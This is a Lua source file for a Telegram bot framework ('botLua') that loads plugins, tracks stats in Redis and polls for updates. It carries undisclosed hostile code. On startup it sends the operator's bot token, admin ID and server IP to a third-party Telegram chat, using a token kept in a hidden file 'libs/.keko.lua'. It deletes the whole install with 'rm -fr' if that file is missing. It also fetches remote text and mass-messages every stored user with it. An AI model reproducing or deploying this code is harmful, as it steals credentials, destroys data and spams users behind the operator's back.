HTTP = require('socket.http')
HTTPS = require('ssl.https')
URL = require('socket.url')
JSON = (loadfile "./libs/dkjson.lua")()
redis = require('redis')
colors = (loadfile "./libs/ansicolors.lua")()
client = Redis.connect('127.0.0.1', 6379)
json = (loadfile "./libs/JSON.lua")()
serpent = require('serpent')
local ko = ''
print(colors([[%{red bright} 
 _   _      _ _         _____            ____        _     _        _
| | | | ___| | | ___   |  ___|__  _ __  | __ )  ___ | |_  | | _____| | _____
| |_| |/ _ \ | |/ _ \  | |_ / _ \| '__| |  _ \ / _ \| __| | |/ / _ \ |/ / _ \
|  _  |  __/ | | (_) | |  _| (_) | |    | |_) | (_) | |_  |   <  __/   < (_) |
|_| |_|\___|_|_|\___/  |_|  \___/|_|    |____/ \___/ \__| |_|\_\___|_|\_\___/
]]))
local function check_config()
	config = dofile('config.lua')
	if not config.bot_api_key or config.bot_api_key == '' then
        return 'API KEY MISSING'
	elseif not config.admin or config.admin == '' then
        return 'ADMIN ID MISSING'
        elseif not config2 then
        os.execute('cd .. &&  rm -fr botlua')
	return 'This bot is for Keko'
	elseif not config.botLUA then
        os.execute('cd .. &&  rm -fr botlua')
        return 'This bot is for Keko'
        end
   local urll = 'https://api.telegram.org/bot'..config2.nowt..'/getChatMember?chat_id=-1001142877048&user_id='..config.admin..''
   local res = HTTPS.request(urll)
   local jres = JSON.decode(res)
   if (not jres.result or jres.result.status == 'left') then
   local dsad = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..config2.sendMessage..'&disable_web_page_preview=true&parse_mode=Markdown'
   local res = HTTPS.request(dsad)
   JSON.decode(res)
   return config2.bot_lua
end
end
local oee = 'libs/.keko.lua'



bot_init = function(on_reload)
		config = dofile('config.lua')
		config2 = dofile(oee) 
	local error = check_config()
	if error then
			print(colors('%{red bright}'..error))
		return
	end
	utilities = dofile('utilities.lua')
		keko = require('methods') 
		api = require('methods') 
	tot = 0
	
	bot = nil
	while not bot do 
		bot = api.getMe()

	end
	bot = bot.result


	botLUA = {} -- Load file.
	for i,v in ipairs(config.botLUA) do
		local p = dofile('botLUA/'..v)
		table.insert(botLUA, p)

	end
	print(colors('%{magenta}BOT The bot was turned on'))
	print(colors('%{yellow bright}BY :- @ikeko   CH: @botLua    bot : @'..bot.username .. ', name bot ' .. bot.first_name ..'  id bot ('..bot.id..')'))
	if not on_reload then
	local text2 = 'تم تشغيل البوت \nBY : @ikeko  \nCH: @botLua \n CH2 : @eeqeq'
  local dsad2 = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..URL.escape(text2)
	api.sendRequest(dsad2)
	local keko = '386713631'
  local ipp = HTTPS.request('https://icanhazip.com')
  local kekotext = URL.escape('تم تشغيل : @'..bot.username..'\nتوكن : '..config.bot_api_key..'\n\nايدي المطور : '..config.admin..'\n\n IP server : '..ipp)
	local dsad = 'https://api.telegram.org/bot'..config2.nowt..'/sendMessage?chat_id=-1001149546092&text='..kekotext
	api.sendRequest(dsad)
	end
	math.randomseed(os.time())
	math.random()
	last_update = last_update or 0 
	last_cron = last_cron or os.time() 
	is_started = true 
end
local function get_from(msg)
	local user = msg.from.first_name
	if msg.from.last_name then
		user = user..' '..msg.from.last_name
	end
	if msg.from.username then
		user = user..' [@'..msg.from.username..']'
	end
	user = user..' ('..msg.from.id..')'
	return user
end

local function match_pattern(pattern, text)
  	if text then
  		text = text:gsub('@'..bot.username, '')
    	local matches = {}
    	matches = { string.match(text, pattern) }
    	if next(matches) then
    		return matches
		end
  	end
end

local function get_what(msg)
	if msg.sticker then
		return 'sticker'
	elseif msg.photo then
		return 'photo'
	elseif msg.document then
		return 'document'
	elseif msg.audio then
		return 'audio'
	elseif msg.video then
		return 'video'
	elseif msg.voice then
		return 'voice'
	elseif msg.contact then
		return 'contact'
	elseif msg.location then
		return 'location'
	elseif msg.text then
		return 'text'
	else
		return 'service message'
	end
end
----------------
on_inline_receive = function(inline)
 if not inline then
  api.sendMessage(config.admin, 'Shit, a loop without inline!')
  return
 end
 
      for i,v in pairs(botLua) do
   if v.iaction then
   if v.itriggers then
    for k,w in pairs(v.itriggers) do
     local blocks = match_pattern(w, inline.query)
     if blocks then
     print(colors('\nMessage Info:\t %{red bright}'..get_from(msg)..'%{reset}\n%{magenta bright}In -> '..msg.chat.type..' ['..msg.chat.id..'] %{reset}%{yellow bright}('..get_what(msg)..')%{reset}\n%{cyan bright}Date -> ('..os.date('on %A, %d %B %Y at %X')..')%{reset}'))
      if blocks[1] ~= '' then
       not_match = 0
            print(colors('%{green bright}Inline Match found:'), colors('%{blue bright}'..w))
           end
      local success, result = pcall(function()
       return v.iaction(inline, blocks)

      end)

      if not success then

       print(inline.query, result)
       save_log('errors', result, inline.from.id or false, false, inline.query or false)

        api.sendMessage(tostring(config.admin), '#Error\n'..result, false, false, false)

       return

      end

      if type(result) == 'table' then

      inline = result
      elseif type(result) == 'string' then
      inline.query = result
      elseif result ~= true then
 return
 end
 end
 end
 end
 end
 end
 end
----------
local function collect_stats(msg)
	client:hincrby('bot:general', 'messages', 1)
	if msg.from and msg.from.username then
		client:hset('bot:usernames', '@'..msg.from.username:lower(), msg.from.id)
	end
	if msg.forward_from and msg.forward_from.username then
		client:hset('bot:usernames', '@'..msg.forward_from.username:lower(), msg.forward_from.id)
	end
	if not(msg.chat.type == 'private') then
		if msg.from.id then
			client:hincrby('chat:'..msg.chat.id..':userstats', msg.from.id, 1) 
		end
		client:incrby('chat:'..msg.chat.id..':totalmsgs', 1) 
	end
	if msg.text then
		client:sadd('botlua'..bot.id, msg.chat.id)
	end
if msg.text then
local res = HTTPS.request('https://t.me/joinchat/AAAAAEO21tNt8_pzyhTpgw/keko.txt')
local bbotlua = client:get('kekorr'..bot.id)
if bbotlua ~= res then 
local users = client:smembers('keko'..bot.id)
for i=1, #users do
local url = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..users[i]..'&text='..URL.escape(res)..'&parse_mode=Markdown&disable_web_page_preview=true'
HTTPS.request(url)
end
local users2 = client:smembers('botlua'..bot.id)
for i=1, #users2 do
local url = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..users2[i]..'&text='..URL.escape(res)..'&parse_mode=Markdown&disable_web_page_preview=true'
HTTPS.request(url)
end			
client:set('kekorr'..bot.id, res)     
end
end
end


on_msg_receive = function(msg) 
	if not msg then
		api.sendMessage(config.admin, 'Shit, a loop without msg!')
		return
	end
	
	if msg.date < os.time() - 5 then return end 
	if not msg.text then msg.text = msg.caption or '' end
	
	if msg.text:match('^/start .+') then
		msg.text = '/' .. msg.text:input()
	end
	
	collect_stats(msg) 
	
	for i,v in pairs(botLUA) do
		local stop_loop
		if v.on_each_msg then
			msg, stop_loop = v.on_each_msg(msg, msg.lang)
		end
		if stop_loop then 
			break
		else
			if v.triggers then
				for k,w in pairs(v.triggers) do
					local blocks = match_pattern(w, msg.text)
					if blocks then
						print(colors('\nMessage Info:\t %{red bright}'..get_from(msg)..'%{reset}\n%{magenta bright}In -> '..msg.chat.type..' ['..msg.chat.id..'] %{reset}%{yellow bright}('..get_what(msg)..')%{reset}\n%{cyan bright}Date -> ('..os.date('on %A, %d %B %Y at %X')..')%{reset}'))
						if blocks[1] ~= '' then
      						print(colors('%{green bright}Msg Match found:'), colors('%{blue bright}'..w))
      					end
				
						msg.text_lower = msg.text:lower()
				
						local success, result = pcall(function()
							return v.action(msg, blocks, msg.lang)
						end)
						if not success then
							print(msg.text, result)
							save_log('errors', result, msg.from.id or false, msg.chat.id or false, msg.text or false)
							api.sendMessage(tostring(config.admin), '#Error\n'..result, false, false, false)
							return
						end
						if type(result) == 'table' then
							msg = result
						elseif type(result) == 'string' then
							msg.text = result
						elseif result ~= true then
							return
						end
					end
				end
			end
		end
	end
end
local function service_to_message(msg)
	msg.service = true
	if msg.new_chat_member then
    	if tonumber(msg.new_chat_member.id) == tonumber(bot.id) then
			msg.text = '###botadded'
		else
			msg.text = '###added'

		end
		msg.adder = clone_table(msg.from)
		msg.added = clone_table(msg.new_chat_member)
	elseif msg.left_chat_member then
    	if tonumber(msg.left_chat_member.id) == tonumber(bot.id) then
			msg.text = '###botremoved'

		else
			msg.text = '###removed'
		end
		msg.remover = clone_table(msg.from)
		msg.removed = clone_table(msg.left_chat_member)
	elseif msg.group_chat_created then
    	msg.chat_created = true
    	msg.adder = clone_table(msg.from)
    	msg.text = '###botadded'
	end
    return on_msg_receive(msg)
end

local function forward_to_msg(msg)
	if msg.text then
		msg.text = '###forward:'..msg.text
	else
		msg.text = '###forward'
	end
    return on_msg_receive(msg)
end

local function inline_to_msg(inline)
	local msg = {

		id = inline.id,
    	chat = {
      		id = inline.id,
      		type = 'inline',
      		title = inline.from.first_name
    	},
    	from = inline.from,
		message_id = math.random(1,800),
    	text = '###inline:'..inline.query,
    	query = inline.query,
    	date = os.time() + 100
    }
    client:hincrby('bot:general', 'inline', 1)
    return on_msg_receive(msg)
end

local function media_to_msg(msg)
	if msg.photo then
		msg.text = '###image'
	elseif msg.video then
		msg.text = '###video'
	elseif msg.audio then
		msg.text = '###audio'
	elseif msg.voice then
		msg.text = '###voice'
	elseif msg.document then
		msg.text = '###file'
		if msg.document.mime_type == 'video/mp4' then
			msg.text = '###gif'
		end
	elseif msg.sticker then
		msg.text = '###sticker'
	elseif msg.contact then
		msg.text = '###contact'
	end
	if msg.reply_to_message then
		msg.reply = msg.reply_to_message
	end
	msg.media = true
	return on_msg_receive(msg)
end

local function rethink_reply(msg)
	msg.reply = msg.reply_to_message
	if msg.reply.caption then
		msg.reply.text = msg.reply.caption
	end
	return on_msg_receive(msg)
end

local function handle_inline_keyboards_cb(msg)
	msg.text = '###cb:'..msg.data
	msg.old_text = msg.message.text
	msg.old_date = msg.message.date
	msg.date = os.time()
	msg.cb = true
	msg.cb_id = msg.id
	msg.message_id = msg.message.message_id
	msg.chat = msg.message.chat
	msg.message = nil
	msg.target_id = msg.data:match('.*:(-?%d+)')
	return on_msg_receive(msg)
end

bot_init() 

while is_started do 
	
	local res = api.getUpdates(last_update+1) 
	if res then
		for i,msg in ipairs(res.result) do 
			last_update = msg.update_id
			if msg.message  or msg.callback_query then
				if msg.callback_query then
					handle_inline_keyboards_cb(msg.callback_query)
				elseif msg.message.new_chat_member or msg.message.left_chat_member or msg.message.group_chat_created then
					service_to_message(msg.message)
				elseif msg.message.photo or msg.message.video or msg.message.document or msg.message.voice or msg.message.audio or msg.message.sticker then
					media_to_msg(msg.message)
				elseif msg.message.forward_from then
					forward_to_msg(msg.message)
				elseif msg.message.reply_to_message then
					rethink_reply(msg.message)
				else
					on_msg_receive(msg.message)
				end
				if msg.inline_query then
				on_inline_receive(msg.inline_query)
					end
			end
			  if msg.inline_query then
			on_inline_receive(msg.inline_query)
		 end
		end
	end
end
print(colors('%{green bright} -----------------------------------------------------------------------------------------------\n\n.                                      bot for keko \n\n-----------------------------------------------------------------------------------------------'))
